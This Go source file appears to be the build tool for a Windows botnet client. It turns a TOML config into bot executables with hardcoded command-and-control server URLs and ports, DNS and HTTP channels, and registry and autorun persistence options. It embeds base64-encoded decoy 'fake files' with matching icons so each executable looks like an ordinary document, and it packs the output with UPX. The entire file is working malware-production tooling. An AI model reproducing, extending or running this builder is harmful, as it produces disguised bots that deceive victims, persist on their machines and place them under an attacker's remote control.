package main

import (
	"encoding/base64"
	"fmt"
	"github.com/BurntSushi/toml"
	"github.com/aglyzov/charmap"
	"github.com/satori/go.uuid"
	"github.com/shiena/ansicolor"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

type Config struct {
	BuildConf buildconf
	Variables variables
	Servers   servers
}

type buildconf struct {
	GobotnetPath      string
	BuildFlags        string
	ReadyFolder       string
	UPXPath           string
	FFFolderPath      string
	IcoFolderPath     string
	FFArray           []string
	IcoArray          []string
	RsrcPath          string
	SysoName          string
	DefaultExeName    string
	CopyNameFromFF    bool
	UsingErrorMessage bool
}

type variables struct {
	UsingDNS       bool
	UsingHTTP      bool
	RewriteExe     bool
	LaunchFakeFile bool
	UsingRegistry  bool
	UsingAutorun   bool
	DebugMode      bool
	AttemptCount   int
	DnsAddress     string
	WinHttpTimeout []int
	FirstInterface string
	UsingGroupId   bool
	CountGroups    int
}

type servers struct {
	Urls  []string
	Ports []int
}

var (
	FFarray        []string
	Iconsarray     []string
	BuildToolName  = "buildtemp.bat"
	gobuildExeName = "client.exe"
)

func CmdExecOrig(cmd string) ([]byte, error) {
	cmd_split := strings.Split(cmd, "@")
	params := make([]string, len(cmd_split)+2)
	params[0] = "/Q"
	params[1] = "/C"
	copy(params[2:], cmd_split[:])

	cmd_li := exec.Command("cmd", params...)
	//cmd_li.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Это необходимо для того что бы CMD запускалось в скрытом режиме
	output, err := cmd_li.Output()

	if output != nil && len(output) > 0 {
		return charmap.CP866_to_UTF8(output), nil
	} else {
		return output, err
	}
}

func createAdditionFileSource(path string, gobotnetPath string) {
	filename := filepath.Base(path)
	input, err := os.Open(path)
	if err != nil {
		handleError("in create AdditionFileSource. ", err)
		return
	}
	fi, err := input.Stat()
	if err != nil {
		handleError("in create AdditionFileSource. ", err)
		return
	}
	b1 := make([]byte, fi.Size())
	_, err = input.Read(b1)

	if err != nil {
		handleError("in create AdditionFileSource. ", err)
		return
	}

	encoded_file := base64.StdEncoding.EncodeToString(b1)
	all_data := "package addfile\n\nimport (\n\"encoding/base64\"\n)\n\nconst (\n str_file = \"" + encoded_file + "\"\n filename=\"" + filename + "\"\n)\n\nfunc GetAdditionFile()(file []byte) {\n decoded,_ := base64.StdEncoding.DecodeString(str_file) \n return decoded\n}\n\nfunc GetAdditionFileName()(name string) {\nreturn filename\n}\n"
	output, err := os.Create(gobotnetPath + "src/addfile/addfile.go")
	if err != nil {
		handleError("in create AdditionFileSource. ", err)
		return
	}

	_, err = output.Write([]byte(all_data))
	if err != nil {
		handleError("in create AdditionFileSource. ", err)
		return
	}
}

func CheckError(err error) bool {
	if err != nil {
		//	OutMessage(err.Error())
		return true
	}
	return false
}

func CheckFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		CheckError(err)
		return false
	} else {
		return true
	}
}

func CopyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if CheckError(err) {
		handleError("in create CopyFileToDirectory. ", err)
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if CheckError(err) {
		handleError("in create CopyFileToDirectory. ", err)
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if CheckError(err) {
		handleError("in create CopyFileToDirectory. ", err)
		return err
	}

	err = destFile.Sync()
	if CheckError(err) {
		handleError("in create CopyFileToDirectory. ", err)
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if CheckError(err) {
		handleError("in create CopyFileToDirectory. ", err)
		return err
	}

	destFileInfo, err := destFile.Stat()
	if CheckError(err) {
		handleError("in create CopyFileToDirectory. ", err)
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		handleError("in create CopyFileToDirectory. ", err)
		CheckError(err)
		return err
	}
	return nil
}

func createBuildTempTool(flags string) {

	all_data := "go build " + flags
	output, err := os.Create(BuildToolName)
	if err != nil {
		handleError("in create "+BuildToolName+". ", err)
		return
	}

	_, err = output.Write([]byte(all_data))
	if err != nil {
		handleError("in create "+BuildToolName+". ", err)
		return
	}

}

func createAdditionConfFile(FFlaunch bool, conf Config, gobotnetPath string, uuid_str string) {

	urlsData := ""

	for i, _ := range conf.Servers.Urls {
		urlsData += "\"" + conf.Servers.Urls[i] + "\""
		if i+1 != len(conf.Servers.Urls) {
			urlsData += ","
		}

	}

	portsData := ""
	for i, _ := range conf.Servers.Ports {
		portsData += strconv.Itoa(conf.Servers.Ports[i])
		if i+1 != len(conf.Servers.Ports) {
			portsData += ","
		}

	}

	all_data := `package addfile

	var (
		usingDNS 			= 	` + strconv.FormatBool(conf.Variables.UsingDNS) + `
		usingHTTP			= 	` + strconv.FormatBool(conf.Variables.UsingHTTP) + `
		launchFakeFile 		= 	` + strconv.FormatBool(FFlaunch) + `  
		usingRegistry  		= 	` + strconv.FormatBool(conf.Variables.UsingRegistry) + `  
		usingAutorun  		= 	` + strconv.FormatBool(conf.Variables.UsingAutorun) + `                        
		debugMode      		= 	` + strconv.FormatBool(conf.Variables.DebugMode) + `                         
		attemptCount   		= 	` + strconv.Itoa(conf.Variables.AttemptCount) + `
		dnsAddress     		= 	"` + conf.Variables.DnsAddress + `"
		winHttpTimeout 		= 	[]int{` + strconv.Itoa(conf.Variables.WinHttpTimeout[0]) + `, ` + strconv.Itoa(conf.Variables.WinHttpTimeout[1]) + `, ` + strconv.Itoa(conf.Variables.WinHttpTimeout[2]) + `, ` + strconv.Itoa(conf.Variables.WinHttpTimeout[3]) + `}
		firstInterface 		= 	"` + conf.Variables.FirstInterface + `"
		rewriteExe 			= 	` + strconv.FormatBool(conf.Variables.RewriteExe) + `
		groupId 			= 	"` + uuid_str + `"
		usingErrorMessage 	= 	` + strconv.FormatBool(conf.BuildConf.UsingErrorMessage) + `
		urls 				= 	[]string{` + urlsData + `}

		ports 				= 	[]int{` + portsData + `}
	)

	func GetUsingDns() bool {
		return usingDNS;
	}

	func GetUsingHttp() bool {
		return usingHTTP;
	}


	func GetRewriteExe() bool{
		return rewriteExe;
	}

	func GetLaunchFakeFile() bool {
		return launchFakeFile;
	}

	func GetDebugMode() bool {
		return debugMode;
	}

	func GetUsingRegistry() bool{
		return usingRegistry;
	}

	func GetUsingAutorun() bool{
		return usingAutorun;
	}

	func GetAttempCount() int{
		return attemptCount;
	}

	func GetDnsAddress() string{
		return dnsAddress;
	}

	func GetWinHttpTimeout() []int{
		return winHttpTimeout;
	}

	func GetServerUrls() []string{
		return urls;
	}

	func GetServerPorts() []int{
		return ports;
	}

	func GetFirstInterface() string{
		return firstInterface;
	}

	func GetGroupId() string{
		return groupId;
	}

	func GetUsingErrorMessage() bool{
		return usingErrorMessage;
	}
			`

	output, err := os.Create(gobotnetPath + "src/addfile/config.go")
	if err != nil {
		handleError("in create createAdditionConfFile. ", err)
		return
	}

	_, err = output.Write([]byte(all_data))
	if err != nil {
		handleError("in create createAdditionConfFile. ", err)
		return
	}

}

func handleError(desc string, err error) {
	w := ansicolor.NewAnsiColorWriter(os.Stdout)
	text := ""
	if err != nil {

		text = "%s%sERROR: " + desc + err.Error() + "%s%s\n"

	} else {
		text = "%s%sERROR: " + desc + "%s%s\n"
	}

	fmt.Fprintf(w, text, "\x1b[31m", "\x1b[1m", "\x1b[21m", "\x1b[0m")

}

func handleWarning(desc string) {
	w := ansicolor.NewAnsiColorWriter(os.Stdout)
	text := ""

	text = "%s%sWarning: " + desc + "%s%s\n"

	fmt.Fprintf(w, text, "\x1b[33m", "\x1b[1m", "\x1b[21m", "\x1b[0m")
}

func handleOutput(desc string) {
	w := ansicolor.NewAnsiColorWriter(os.Stdout)
	text := ""

	text = "%s%s" + desc + "%s%s\n"

	fmt.Fprintf(w, text, "\x1b[37m", "\x1b[1m", "\x1b[21m", "\x1b[0m")
}

func handleResult(desc string) {
	w := ansicolor.NewAnsiColorWriter(os.Stdout)
	text := ""

	text = "%s%s" + desc + "%s%s\n"

	fmt.Fprintf(w, text, "\x1b[32m", "\x1b[1m", "\x1b[21m", "\x1b[0m")
}

func checkConfig(conf Config) (config Config, err bool) {

	if len(conf.BuildConf.ReadyFolder) <= 0 {

		handleWarning("Ready folder hasn't defined. Binary files will be copied in this directory")
	}

	if len(conf.BuildConf.UPXPath) > 0 {
		if !CheckFileExist(conf.BuildConf.UPXPath) {
			handleError("UPX was defined but no available exe-file in this path, building without UPX", nil)
			conf.BuildConf.UPXPath = ""
		}
	} else {
		handleWarning("UPX hasn't been defined. Building without UPX packing.")
	}

	if len(conf.BuildConf.RsrcPath) > 0 {
		if !CheckFileExist(conf.BuildConf.RsrcPath) {
			handleError("rsrc.exe was defined but no available exe-file in this path, building without ICONS", nil)
			conf.BuildConf.RsrcPath = ""
		}
	} else {
		handleWarning("rsrc.exe hasn't been defined. Building without creating ICONS.")
	}

	if len(conf.BuildConf.SysoName) <= 0 {
		handleWarning("Syso name hasn't been defined, using default 'main.syso'")
		conf.BuildConf.SysoName = "main.syso"
	}

	if len(conf.BuildConf.DefaultExeName) <= 0 {
		handleWarning("Default exe name hasn't been defined, using default 'gobot.exe'")
		conf.BuildConf.DefaultExeName = "gobot.exe"
	}

	if conf.Variables.AttemptCount < 1 {
		handleWarning("Your attempt count is less or equal 0. Change it to 1 ")
		conf.Variables.AttemptCount = 1
	}

	if !conf.Variables.UsingHTTP && !conf.Variables.UsingDNS {
		handleError("both UsingHTTP and UsingDNS was set to false, BOT can't work without any protocols, are you sure?", nil)
		return conf, false
	}

	if len(conf.Variables.DnsAddress) <= 0 && conf.Variables.UsingDNS {
		handleError("usingDNS is true, but DNS address hasn't been defined", nil)
		return conf, false
	}

	if len(conf.Variables.DnsAddress) > 0 && !conf.Variables.UsingDNS {
		handleWarning("DNS address defined, but usingDNS was set to false. In this case BOT will be never use DNS, set UsingDNS to true if you employ DNS")
	}

	if conf.Variables.FirstInterface != "HTTP" && conf.Variables.FirstInterface != "DNS" {
		handleError("First interface hasn't been defined correctly. Setting HTTP by default", nil)
		conf.Variables.FirstInterface = "HTTP"
	}

	if conf.Variables.FirstInterface == "HTTP" && !conf.Variables.UsingHTTP {
		handleError("UsingHTTP false, but first interface was set to HTTP, logic error", nil)
		return conf, false
	}

	if conf.Variables.FirstInterface == "DNS" && !conf.Variables.UsingDNS {
		handleError("UsingDNS false, but first interface was set to DNS, logic  error", nil)
		return conf, false
	}

	if len(conf.Variables.WinHttpTimeout) != 4 {
		handleError("WinHTTP timeout must be declare as 4-size array. Setting it to default {0, 60000, 30000, 30000}", nil)
		conf.Variables.WinHttpTimeout = []int{0, 60000, 30000, 30000}
	}

	if len(conf.Servers.Urls) <= 0 {
		handleError("any C&C servers url didn't found. ", nil)
		return conf, false
	}

	if len(conf.Servers.Ports) <= 0 {
		handleError("any ports for C&C server didn't found. ", nil)
		return conf, false
	}

	if len(conf.Servers.Ports) != len(conf.Servers.Urls) {
		handleError("count of server urls and ports doesn't match. ", nil)
		return conf, false
	}

	if conf.Variables.UsingGroupId {
		handleOutput("Using group id, default exe filename will be changed to UUID Group ID")
	}

	if conf.BuildConf.UsingErrorMessage {
		handleOutput("Using ErrorMessage, fake files won't launched")
	}

	return conf, true
}

func build(conf Config) {
	handleOutput("Check TOML Config:")

	//	var countIco, countFF int

	conf, res := checkConfig(conf)
	if !res {
		return
	} else {
		handleResult("Config OK!")
	}

	if len(conf.BuildConf.FFFolderPath) > 0 {
		handleOutput("Reading FF from folder")

		files, _ := ioutil.ReadDir(conf.BuildConf.FFFolderPath)
		FFarray = make([]string, len(files))
		for i, f := range files {
			handleOutput("Found " + f.Name())
			FFarray[i] = conf.BuildConf.FFFolderPath + f.Name()

		}

		if len(conf.BuildConf.IcoFolderPath) > 0 {
			handleOutput("Reading Icons from folder")

			Iconsarray = make([]string, len(files))
			for i, _ := range FFarray {

				filename := filepath.Base(FFarray[i])
				f, err := os.Open(conf.BuildConf.IcoFolderPath + filename + ".ico")
				if err != nil {
					Iconsarray[i] = ""
					handleWarning("Icon for " + filename + " not found")
				} else {
					Iconsarray[i] = conf.BuildConf.IcoFolderPath + filename + ".ico"
					handleOutput("Found icon for " + filename)

				}
				f.Close()
			}
		} else {
			handleWarning("Icons for FF hasn't defined, build will be without icons")
		}

	} else if len(conf.BuildConf.FFArray) > 0 {
		handleOutput("Reading FF from conf array")

		FFarray = make([]string, len(conf.BuildConf.FFArray))

		for i, _ := range conf.BuildConf.FFArray {
			if len(conf.BuildConf.FFArray[i]) > 0 {
				f, err := os.Open(conf.BuildConf.FFArray[i])
				if err != nil {
					FFarray[i] = ""
					handleWarning(conf.BuildConf.FFArray[i] + " not found")
				} else {
					FFarray[i] = conf.BuildConf.FFArray[i]
					handleOutput("Found " + conf.BuildConf.FFArray[i])
				}
				f.Close()
			} else {
				FFarray[i] = ""
				handleWarning("Escape empty name")
			}
		}

		if len(conf.BuildConf.IcoArray) > 0 {

			Iconsarray = make([]string, len(conf.BuildConf.IcoArray))
			handleOutput("Reading Icons from conf array")

			for i, _ := range conf.BuildConf.IcoArray {
				if len(conf.BuildConf.IcoArray[i]) > 0 {
					f, err := os.Open(conf.BuildConf.IcoArray[i])
					if err != nil {
						Iconsarray[i] = ""
						handleWarning(conf.BuildConf.IcoArray[i] + " not found")
					} else {
						Iconsarray[i] = conf.BuildConf.IcoArray[i]
						handleOutput("Found " + conf.BuildConf.IcoArray[i])
					}
					f.Close()
				} else {
					Iconsarray[i] = ""
					handleWarning("Escape empty name")
				}
			}
		} else {
			handleWarning("Icons for FF haven't defined, build will be without icons")
		}

	} else {
		handleWarning("Any FF not found, building with last known FF. The variable launchFakeFile automaticly sets false")

		if len(conf.BuildConf.IcoArray) > 0 {

			Iconsarray = make([]string, len(conf.BuildConf.IcoArray))
			handleOutput("Reading Icons from conf array")

			for i, _ := range conf.BuildConf.IcoArray {
				if len(conf.BuildConf.IcoArray[i]) > 0 {
					_, err := os.Open(conf.BuildConf.IcoArray[i])
					if err != nil {
						Iconsarray[i] = ""
						handleWarning(conf.BuildConf.IcoArray[i] + " not found")
					} else {
						Iconsarray[i] = conf.BuildConf.IcoArray[i]
						handleOutput("Found " + conf.BuildConf.IcoArray[i])
					}
				} else {
					Iconsarray[i] = ""
					handleWarning("Escape empty name")
				}
			}
		} else {
			fmt.Println("Icons for FF haven't defined, build will be without icons")
		}
	}

	countExe := 1

	//	fmt.Println(len(Iconsarray))
	//	fmt.Println(len(FFarray))

	if len(Iconsarray) != len(FFarray) {
		handleError("count fakefiles and icons doesn't match. There is only one exe will be builded with first FF and ICO in array (if they are exist)", nil)
	} else if len(FFarray) == 0 && len(Iconsarray) > 0 {
		//Never using
		countExe = len(Iconsarray)
	} else {
		countExe = len(Iconsarray)
	}

	handleResult("Building with next fake files and icons: ")

	for i := 0; i < countExe; i++ {
		filename := ""
		iconame := ""
		if len(FFarray[i]) > 0 {
			filename = FFarray[i]
		} else {
			filename = "<empty FF>"
		}

		if len(Iconsarray[i]) > 0 {
			iconame = Iconsarray[i]
		} else {
			iconame = "<empty ICON>"
		}
		handleResult(filename + " " + iconame)

	}

	fmt.Println("")

	handleResult("Total count: " + strconv.Itoa(countExe))

	for i := 0; i < 5; i++ {
		fmt.Printf(".")
		time.Sleep(time.Millisecond * 500)
	}
	fmt.Println("")

	createBuildTempTool(conf.BuildConf.BuildFlags)

	countGroups := 1

	if conf.Variables.UsingGroupId {
		countGroups = conf.Variables.CountGroups
	}
	for j := 0; j < countGroups; j++ {
		for i := 0; i < countExe; i++ {

			handleOutput("Make " + strconv.Itoa(i) + " ")

			uuid_str := ""
			if conf.Variables.UsingGroupId {
				uuid_str = uuid.NewV4().String()
			}

			//fmt.Println(conf.Variables.winHttpTimeout)
			FFlaunch := conf.Variables.LaunchFakeFile
			if FFlaunch && len(FFarray[i]) > 0 {
				createAdditionFileSource(FFarray[i], conf.BuildConf.GobotnetPath)
			} else {
				handleWarning("Fake file for this step not found, building without FF")
				FFlaunch = false
			}
			handleOutput("Make conf file")
			createAdditionConfFile(FFlaunch, conf, conf.BuildConf.GobotnetPath, uuid_str)
			handleOutput("Make ICO file")
			if len(Iconsarray[i]) > 0 {

				if len(conf.BuildConf.RsrcPath) > 0 {
					handleOutput("Make icon:" + Iconsarray[i])

					CmdExecOrig(conf.BuildConf.RsrcPath + " -ico " + Iconsarray[i] + " -o " + conf.BuildConf.SysoName)
				} else {
					handleWarning("rsrc.exe not found, building without icon")
				}

			} else {
				handleWarning("Icon for this step not found, building without icon")
				CmdExecOrig("del " + conf.BuildConf.SysoName)
			}

			handleOutput("Build main.go")

			cmd_li := exec.Command("cmd", "/C", BuildToolName)
			err := cmd_li.Run()
			if err != nil {
				handleError("in build. ", err)
			}

			outputExeName := ""
			if len(conf.BuildConf.ReadyFolder) > 0 {
				outputExeName = conf.BuildConf.ReadyFolder
			}

			if !conf.Variables.UsingGroupId {
				if conf.BuildConf.CopyNameFromFF {

					if len(FFarray[i]) > 0 {
						outputExeName += filepath.Base(FFarray[i]) + ".exe"
					} else {
						outputExeName += strconv.Itoa(i) + conf.BuildConf.DefaultExeName
					}

				} else {
					outputExeName += strconv.Itoa(i) + conf.BuildConf.DefaultExeName
				}
			} else {

				outputExeName += strconv.Itoa(i) + "-" + uuid_str + ".exe"
			}

			if len(conf.BuildConf.UPXPath) > 0 {
				handleOutput("UPX packer working, packed file to ready folder " + outputExeName)
				_, err = CmdExecOrig(conf.BuildConf.UPXPath + " -9 " + gobuildExeName + " -o " + outputExeName)
			} else {
				handleOutput("Copy file to ready folder " + outputExeName)
				err = CopyFileToDirectory(gobuildExeName, outputExeName)
			}
			if err != nil {
				handleError(" in copy file to ready folder", err)
			} else {
				handleResult(outputExeName + " builded")
			}
			for i := 0; i < 5; i++ {
				fmt.Printf(".")
				time.Sleep(time.Millisecond * 500)
			}
			fmt.Println("")
		}
	}

	handleOutput("Clearing after build...")
	CmdExecOrig("del " + conf.BuildConf.SysoName)
	CmdExecOrig("del " + BuildToolName)
}

func main() {

	handleWarning("Please make sure that you have deleted all .syso files from this directory.")
	handleWarning("Also clear your ready folder, because UPX cannot write file in folder if filename exist.")
	handleWarning("If you haven't defined any BOOL variables all of them will be false by default.")

	for i := 0; i < 5; i++ {
		fmt.Printf(".")
		time.Sleep(time.Millisecond * 500)
	}
	fmt.Println("")

	var conf Config

	var confFile string
	//fmt.Println(len(os.Args))
	if len(os.Args) == 2 {
		confFile = os.Args[1]
	} else {
		confFile = "configuration.toml"
	}

	//fmt.Println(confFile)
	if _, err := toml.DecodeFile(confFile, &conf); err != nil {
		handleError("in reading TOML config", err)
	}

	build(conf)

}
